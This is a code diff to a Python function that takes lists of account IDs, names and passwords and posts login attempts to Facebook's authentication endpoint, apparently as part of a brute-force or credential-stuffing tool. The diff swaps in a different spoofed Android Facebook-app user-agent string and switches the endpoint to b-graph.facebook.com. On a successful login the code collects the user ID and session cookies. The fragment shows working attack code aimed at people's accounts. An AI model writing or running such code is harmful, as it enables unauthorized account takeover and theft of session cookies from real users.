@@ -350,7 +350,7 @@ def api3(ids,names,passlist):
             fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
             fbbv = str(random.randint(000000000,999999999))
             accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/91.0.0.6339;FBBV/2825202;FBDM/{density=,,width=720,height=1280};FBLC/en_US;FBRV/4758209;FBCR/null;FBMF/Symphony;FBBD/Symphony;FBPN/com.facebook.adsmanager;FBDV/Z25;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/38.0.0.3137;FBBV/8730088;FBDM/{density=0,width=720,height=1280};FBLC/en_US;FBRV/5477079;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.lite;FBDV/P40 Lite;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             head = {'User-Agent':uaddx,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
@@ -386,7 +386,7 @@ def api3(ids,names,passlist):
             'locale':'es_ES','client_country_code':'ES',
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
             if 'session_key' in po:
                     uid = str(po['uid'])
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
